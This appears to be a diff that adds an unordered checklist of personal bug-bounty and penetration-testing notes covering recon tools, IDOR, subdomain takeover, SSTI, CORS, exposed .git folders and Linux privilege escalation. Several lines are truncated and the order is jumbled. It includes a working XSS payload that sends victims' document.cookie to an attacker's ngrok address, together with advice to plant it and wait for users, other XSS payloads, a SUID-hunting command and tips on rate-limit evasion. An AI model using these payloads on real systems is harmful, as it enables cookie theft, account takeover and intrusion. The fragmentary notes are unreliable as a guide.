@@ -1,0 +1,100 @@
+- [ ] use encoded versions of /../..(double url encoding and partial url encoding)
+- [ ] offer unsolicited ids to the application
+- [ ] look for source code (like java script or php (.js or .php))
+- [ ] change request methods and try the above task
+- [ ] —→ RECON ←—-
+- [ ] extract all JS files
+- [ ] Directory enumeration 
+- [ ] ——-sub——> Subdomain enumeration ←—-sub——-
+- [ ] Extract all urls 
+- [ ] use 
+- [ ] https://medusa0xf.medium.com/how-i-found-a-3000-idor-vulnerability-in-a-delivery-app-d15167b6f963?sk=c9546ff39b5c9a27201cda30fd401141
+- [ ] create two accounts and test Idor + broken access control
+- [ ] broken link hijacking 
+- [ ] use Can-I-Takeover xyz for reference and the proof, if it’s not enough just go for taking over the subdomain
+- [ ] use custom build web scrapers or already available tools or just do it manually
+- [ ] ———> Subdomain Takeover ←——
+- [ ] try injecting {{7*7}} and check for internal server errors or the results 
+- [ ] use ngrok to forward the request to the 
+- [ ] run an http server with python
+- [ ] ngrok http 80 —> this will just forward the request to http server at 
+- [ ] try privesc if you get the shell
+- [ ] try analysing all binaries with root permissions
+- [ ] look for a payload for webshell , google sites which give ready made payoads
+- [ ] use git to check for common vulnerabilities and POC
+- [ ] use exploit db to check for CVEs
+- [ ] python3 -m http.server 8080 (example)
+- [ ] SSTI (server side template injection)
+- [ ] Check for outdated services and CVEs 
+- [ ] if you get a hit, lookup for a payload for rce , use reverse shell generator (google this) to get help in generating payload
+- [ ] go to the folder of interest in the local machine and serve that on the 
+- [ ] XSS
+- [ ] try doing sudo -ls to list all the binaries that can be run with sudo without password
+- [ ] try downloading and using linpeas or winpeas or pwnkit or anything from your local machine into the pwned machine
+- [ ] in the above example, the new Image tag is created in the memory and is not needed to be created in the DOM to work
+- [ ] example —> <script>new Image().src = “http://<ngrok’s address>?c= ‘ + document.cookie </script>
+- [ ] use the xss payload in a way that it sends data to the ngrok’s web intereface so that all that data can be forwarded to us
+- [ ] put the xss in and wait for someone to interact
+- [ ] find / -user root -perm -u=s -ls 2>/dev/null 
+- [ ] add special characters like 0a% %20 %1c %09 %00
+- [ ] use hacktricks (google it) for some payloads
+- [ ] use gourlex 
+- [ ] use ffuf
+- [ ] use subdominator
+- [ ] use subfinder 
+- [ ] use virustotal 
+- [ ] find 404 pages and use dig to CNAME records if there is a possibility
+- [ ] use google dorking
+- [ ] use dirsearch
+- [ ] watch the video for one technique —> 
+- [ ] also try the “-recursion” flag in ffuf , it recursively fuzzes the found directories so that we can find all the directories
+- [ ] use matcher (-mc flag) to add the status codes that ffuf does not originally include
+- [ ] see this video to know a better methodology —> 
+- [ ] imp —> 200. 201, 300-307, 400, 405, 415, 403, 401
+- [ ] recon on nginx server (if there exists one)
+- [ ] closely analyze the acao (access control allow origin), acam (access control allow methods), acac(access control allow credentials) headers in the reponse after adding the origin header
+- [ ]  adding the origin header 
+- [ ] CORS
+- [ ] check if the origin as null is accepted and reflected in the response
+- [ ] check if the attackers domain as the origin is reflected in the response
+- [ ] use feroxbuster tool for forced browsing to look for pages that are not linked directly but still exists
+- [ ] use subjs tool to find all the js files 
+- [ ] use subzy tool (it works based on matching fingerprints from can-i-takeover-xyz)
+- [ ] use rustbuster tool for content discovery
+- [ ] use linkfinder tool to extract the discover urls from the js files that you have extracted
+- [ ] use secret finder tool to discover secrets like api keys, passwords etc from the js files
+- [ ] use sites and tools for getting a headstart in recon as it is alredy done there
+- [ ] use chaos on github
+- [ ] use  
+- [ ] sometimes while bruteforcing (in possible scenarios), there is rate limiting , to bypass that , use ip rotation by scripting 
+- [ ] 2FA bypass
+- [ ] payloads
+- [ ] %22onmouseover=%27onfocus=%27alert(1)%27%20autofocus=%27(9824)%22
+- [ ] we can read the blob file (using —> git cat-file -p <blob’s hash>) to read the commits and the files and we might get the pushed keys
+- [ ] 
+Even if you delete your API key from the file and push a new commit, 
+- [ ] '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+- [ ] git recon
+- [ ] check if the git folder is public by adding /.git in the root url
+- [ ] create 2 accounts and compare for the requests
+- [ ] use wayback machine to see the past versions of the same site.
+- [ ] change the file type
+- [ ] CSRF
+- [ ] https://web.archive.org/web/*/
+- [ ] look for software version number and configuration information by using recon
+- [ ] IDOR
+- [ ] check for exposed .git directories
+- [ ] parameter pollution
+- [ ] capture requests
+- [ ] find info in public files
+- [ ] response manipulation
+- [ ] try to decode hashed and encrypted ids
+- [ ] Information Disclosure
+- [ ] paste bin
+- [ ] git hub gists
+- [ ] try searching for leaked ids
+- [ ] use tools to automate the process (pastebin-scraper)(get the pastebin ids and then acees those files from pastebins’ site)
+- [ ] use path traversal techniques to access a forbidden folder.
+- [ ] to automate finding java scipt files use tools (link finder)
+- [ ] try blind idors
+- [ ] look for configuration files (.conf or .env or try other extensions)
